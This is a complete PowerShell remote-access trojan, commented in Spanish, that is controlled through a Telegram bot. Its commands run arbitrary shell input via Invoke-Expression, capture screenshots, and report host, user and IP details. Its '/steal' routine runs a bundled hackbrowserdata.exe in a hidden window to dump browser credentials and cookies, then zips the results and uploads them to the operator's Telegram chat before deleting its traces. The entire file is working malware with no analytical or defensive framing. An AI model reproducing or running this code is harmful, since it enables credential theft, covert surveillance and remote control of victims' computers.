param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

# === PREVENIR MULTIPLES INSTANCIAS ===
$mutexName = "Global\TelegramBot_$($Token.Substring(0,10))"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) {
    Write-Host "[!] Bot ya esta corriendo. Saliendo..."
    exit 1
}

# Lock para operaciones de steal
$stealLock = New-Object System.Object

# Liberar mutex al salir
trap {
    $mutex.ReleaseMutex()
    $mutex.Dispose()
    exit 1
}

$ErrorActionPreference = 'Continue'
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = Join-Path $env:APPDATA 'CarpetaDos\bot.log'
$HackPath = Join-Path $env:APPDATA 'CarpetaDos\hackbrowserdata.exe'

New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
    Write-Host $line
}

# Desactivar webhook y limpiar updates pendientes
try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post -ErrorAction Stop | Out-Null
    Write-Log "Webhook desactivado"
    Start-Sleep -Seconds 3
    
    # Limpiar updates pendientes
    $updates = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=-1" -Method Get
    if ($updates.result.Count -gt 0) {
        $lastId = ($updates.result | Select-Object -Last 1).update_id
        Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId + 1)" -Method Get | Out-Null
    }
} catch {
    Write-Log "Error limpiando webhook: $($_.Exception.Message)"
}

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

function Send-Message {
    param([string]$Text, [string]$TargetChatId = $ChatId)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        
        $body = @{
            chat_id = $TargetChatId
            text = $Text
            parse_mode = "HTML"
        } | ConvertTo-Json -Compress
        
        $response = Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body
        return $true
    } catch {
        Write-Log "Error Send-Message: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param(
        [string]$Path, 
        [string]$Caption="", 
        [string]$TargetChatId = $ChatId
    )
    
    try {
        if (-not (Test-Path $Path)) {
            Write-Log "Archivo no existe: $Path"
            return $false
        }
        
        $fileInfo = Get-Item $Path
        if ($fileInfo.Length -gt 49MB) {
            Write-Log "Archivo muy grande: $($fileInfo.Length)"
            Send-Message -Text "Archivo muy grande: $($fileInfo.Name)" -TargetChatId $TargetChatId
            return $false
        }
        
        # Metodo nativo de PowerShell 5.1 usando -Form
        $form = @{
            chat_id = $TargetChatId
            document = Get-Item $Path
        }
        
        if ($Caption) {
            $form['caption'] = $Caption
        }
        
        $response = Invoke-RestMethod -Uri "$ApiUrl/sendDocument" -Method Post -Form $form
        
        Write-Log "Archivo enviado OK: $($fileInfo.Name)"
        return $true
        
    } catch {
        Write-Log "Error Send-File: $($_.Exception.Message)"
        return $false
    }
}

function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    
    $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
    if (-not $os) { $os = "Windows" }
    
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
}

function Take-Screenshot {
    $path = $null
    $bitmap = $null
    $graphics = $null
    
    try {
        # Verificar si estamos en una sesion interactiva
        $session = (Get-Process -Id $PID).SessionId
        $consoleSession = (Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Select-Object -First 1).SessionId
        
        if ($session -ne $consoleSession) {
            Send-Message -Text "Error: No hay sesion de escritorio activa"
            return $false
        }
        
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        if (-not $screen) {
            Send-Message -Text "Error: No se pudo obtener pantalla primaria"
            return $false
        }
        
        $width = $screen.Bounds.Width
        $height = $screen.Bounds.Height
        
        if ($width -le 0 -or $height -le 0) {
            Send-Message -Text "Error: Dimensiones de pantalla invalidas"
            return $false
        }
        
        $bitmap = New-Object System.Drawing.Bitmap($width, $height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        $graphics.CopyFromScreen(
            $screen.Bounds.Location, 
            [System.Drawing.Point]::Empty, 
            $screen.Bounds.Size
        )
        
        $path = Join-Path $env:TEMP "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        
        # Asegurar directorio
        $dir = Split-Path $path -Parent
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
        
        # Guardar con formato especifico
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        
        # Verificar que se guardo
        if (-not (Test-Path $path)) {
            Send-Message -Text "Error: No se pudo guardar el archivo"
            return $false
        }
        
        $result = Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        return $result
        
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        Send-Message -Text "Error capturando: $($_.Exception.Message)"
        return $false
    } finally {
        # Limpiar recursos en orden inverso
        if ($graphics) { 
            try { $graphics.Dispose() } catch {}
        }
        if ($bitmap) { 
            try { $bitmap.Dispose() } catch {}
        }
        if ($path -and (Test-Path $path)) {
            try { Remove-Item $path -Force -ErrorAction SilentlyContinue } catch {}
        }
    }
}

function Run-Steal {
    param([string]$TargetChatId = $ChatId)
    
    # Lock para evitar ejecuciones simultaneas
    if (-not [System.Threading.Monitor]::TryEnter($stealLock, 0)) {
        Send-Message -Text "Ya hay una extraccion en curso..." -TargetChatId $TargetChatId
        return
    }
    
    try {
        Send-Message -Text "Extrayendo datos..." -TargetChatId $TargetChatId
        Write-Log "Iniciando extraccion de navegadores"
        
        if (-not (Test-Path $HackPath)) {
            Send-Message -Text "Error: hackbrowserdata.exe no encontrado" -TargetChatId $TargetChatId
            return
        }
        
        # Crear directorio unico con timestamp + random para evitar conflictos
        $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
        $random = Get-Random -Minimum 1000 -Maximum 9999
        $outputDir = Join-Path $env:TEMP "browser_${timestamp}_$random"
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
        
        Write-Log "Directorio salida: $outputDir"
        
        try {
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $HackPath
            $psi.Arguments = "dump -d `"$outputDir`" -f json --verbose"
            $psi.CreateNoWindow = $true
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.UseShellExecute = $false
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            
            $proc = [System.Diagnostics.Process]::Start($psi)
            
            # Esperar maximo 3 minutos
            if (-not $proc.WaitForExit(180000)) {
                $proc.Kill()
                Write-Log "Timeout - matando proceso hackbrowserdata"
                Send-Message -Text "Timeout en extraccion" -TargetChatId $TargetChatId
                return
            }
            
            $stdout = $proc.StandardOutput.ReadToEnd()
            $stderr = $proc.StandardError.ReadToEnd()
            
            Write-Log "Exit code: $($proc.ExitCode)"
            if ($stdout) { Write-Log "Stdout: $stdout" }
            if ($stderr) { Write-Log "Stderr: $stderr" }
            
            # Buscar JSONs
            $jsonFiles = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
            
            if (-not $jsonFiles -or $jsonFiles.Count -eq 0) {
                Send-Message -Text "No se generaron archivos JSON" -TargetChatId $TargetChatId
                return
            }
            
            Write-Log "Encontrados $($jsonFiles.Count) archivos JSON"
            Send-Message -Text "Encontrados $($jsonFiles.Count) archivos. Enviando..." -TargetChatId $TargetChatId
            
            $sent = 0
            $failed = 0
            
            foreach ($json in $jsonFiles) {
                $zipPath = $null
                try {
                    # Nombre unico para cada zip
                    $zipName = "$($json.BaseName)_$(Get-Random).zip"
                    $zipPath = Join-Path $env:TEMP $zipName
                    
                    # Esperar si el archivo esta en uso
                    $retry = 0
                    while ($retry -lt 3) {
                        try {
                            if (Test-Path $zipPath) { Remove-Item $zipPath -Force -ErrorAction Stop }
                            break
                        } catch {
                            $retry++
                            Start-Sleep -Milliseconds 500
                        }
                    }
                    
                    Compress-Archive -Path $json.FullName -DestinationPath $zipPath -Force -CompressionLevel Optimal -ErrorAction Stop
                    
                    # Verificar que se creo
                    if (-not (Test-Path $zipPath)) {
                        Write-Log "No se pudo crear zip para $($json.Name)"
                        $failed++
                        continue
                    }
                    
                    $caption = $json.BaseName
                    
                    if (Send-File -Path $zipPath -Caption $caption -TargetChatId $TargetChatId) {
                        $sent++
                    } else {
                        $failed++
                    }
                    
                    # Delay entre archivos
                    Start-Sleep -Milliseconds 1500
                    
                } catch {
                    Write-Log "Error procesando $($json.Name): $($_.Exception.Message)"
                    $failed++
                } finally {
                    if ($zipPath -and (Test-Path $zipPath)) {
                        try { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue } catch {}
                    }
                }
            }
            
            Send-Message -Text "Completado. Enviados: $sent | Fallidos: $failed | Total: $($jsonFiles.Count)" -TargetChatId $TargetChatId
            
        } finally {
            # Limpiar directorio temporal
            if ($outputDir -and (Test-Path $outputDir)) {
                try {
                    Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
                    Write-Log "Directorio temporal eliminado"
                } catch {
                    Write-Log "Error eliminando directorio: $($_.Exception.Message)"
                }
            }
        }
        
    } catch {
        Write-Log "Error Run-Steal: $($_.Exception.Message)"
        Send-Message -Text "Error: $($_.Exception.Message)" -TargetChatId $TargetChatId
    } finally {
        [System.Threading.Monitor]::Exit($stealLock)
    }
}

function Execute-Cmd {
    param([string]$Command, [string]$TargetChatId = $ChatId)
    
    Write-Log "Ejecutando: $Command"
    
    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        
        if ([string]::IsNullOrWhiteSpace($output)) {
            $output = "(comando ejecutado sin salida)"
        }
        
        # Guardar en archivo temporal
        $tempFile = Join-Path $env:TEMP "cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $content = "Comando: $Command`nFecha: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output"
        [System.IO.File]::WriteAllText($tempFile, $content, [System.Text.Encoding]::UTF8)
        
        # Enviar como archivo
        if (Send-File -Path $tempFile -Caption "Resultado de: $Command" -TargetChatId $TargetChatId) {
            $lines = $output -split "`n" | Where-Object { $_.Trim() } | Select-Object -First 3
            $preview = ($lines -join "`n")
            if ($preview.Length -gt 100) { $preview = $preview.Substring(0, 100) + "..." }
            Send-Message -Text "Comando ejecutado. Archivo enviado.`nPreview:`n$preview" -TargetChatId $TargetChatId
        }
        
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
    } catch {
        Send-Message -Text "Error ejecutando comando: $($_.Exception.Message)" -TargetChatId $TargetChatId
    }
}

function Process-Command {
    param([string]$Text, [string]$FromChatId)
    
    Write-Log "Procesando: '$Text'"
    $cmd = $Text.Trim()
    $cmdLower = $cmd.ToLower()
    
    # Separar comando y argumentos
    if ($cmdLower -match '^(/?[a-z]+)\s*(.*)') {
        $baseCmd = $Matches[1]
        $args = $Matches[2].Trim()
    } else {
        return
    }
    
    switch ($baseCmd) {
        { $_ -in 'ls', '/ls' } {
            try {
                $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio: $(Get-Location)`n`n$items"
            } catch {
                Send-Message -Text "Error: $($_.Exception.Message)"
            }
        }
        
        { $_ -in 'cmd', '/cmd' } {
            if ($args) {
                Execute-Cmd -Command $args
            } else {
                Send-Message -Text "Uso: /cmd <comando>"
            }
        }
        
        { $_ -in 'cd', '/cd' } {
            if ($args) {
                try {
                    Set-Location $args -ErrorAction Stop
                    Send-Message -Text "Ahora en: $(Get-Location)"
                } catch {
                    Send-Message -Text "Error: No se pudo ir a '$args'"
                }
            } else {
                Send-Message -Text "Uso: /cd <ruta>"
            }
        }
        
        { $_ -in 'pwd', '/pwd' } {
            Send-Message -Text "Directorio: $(Get-Location)"
        }
        
        { $_ -in 'steal', '/steal' } {
            Run-Steal
        }
        
        { $_ -in 'captura', '/captura' } {
            Send-Message -Text "Capturando..."
            if (-not (Take-Screenshot)) {
                Send-Message -Text "Error al capturar pantalla"
            }
        }
        
        { $_ -in 'info', '/info' } {
            Send-Message -Text (Get-Info)
        }
        
        { $_ -in 'help', '/help' } {
            Send-Message -Text @'
Comandos:
/ls - Listar archivos
/cmd <comando> - Ejecutar (resultado en .txt)
/cd <ruta> - Cambiar directorio
/pwd - Directorio actual
/steal - Extraer datos navegadores
/captura - Screenshot
/info - Info del sistema
/help - Esta ayuda
'@
        }
        
        default {
            Write-Log "Comando desconocido: $baseCmd"
        }
    }
}

# Inicio
Write-Log "=== BOT INICIADO ==="
Write-Log "ChatId: $ChatId"

Send-Message -Text "Bot online - $(Get-Info)"

$lastUpdateId = 0
$consecutiveErrors = 0
$maxConsecutiveErrors = 10

while ($true) {
    try {
        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=10"
        $response = Invoke-RestMethod -Uri $url -TimeoutSec 60
        
        $consecutiveErrors = 0
        
        if ($response.ok -and $response.result.Count -gt 0) {
            foreach ($update in $response.result) {
                $lastUpdateId = $update.update_id
                $message = $update.message
                
                if ($null -eq $message -or [string]::IsNullOrEmpty($message.text)) { continue }
                
                $msgChatId = [string]$message.chat.id
                
                if ($msgChatId -eq $ChatId) {
                    Process-Command -Text $message.text -FromChatId $msgChatId
                } else {
                    Write-Log "Mensaje de otro chat: $msgChatId (esperado: $ChatId)"
                }
            }
        }
    } catch {
        $err = $_.Exception.Message
        $consecutiveErrors++
        
        if ($err -like "*409*") {
            if ($consecutiveErrors -eq 1) {
                Write-Log "Error 409 (Conflicto) - Limpiando..."
            }
            try {
                Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=-1" -TimeoutSec 10 | Out-Null
                Start-Sleep -Seconds 3
            } catch {}
        } elseif ($consecutiveErrors -ge $maxConsecutiveErrors) {
            Write-Log "Demasiados errores. Esperando 30s..."
            Start-Sleep -Seconds 30
            $consecutiveErrors = 0
        } else {
            Write-Log "Error bucle: $err"
        }
        
        Start-Sleep -Seconds 2
    }
    
    Start-Sleep -Milliseconds 1000
}
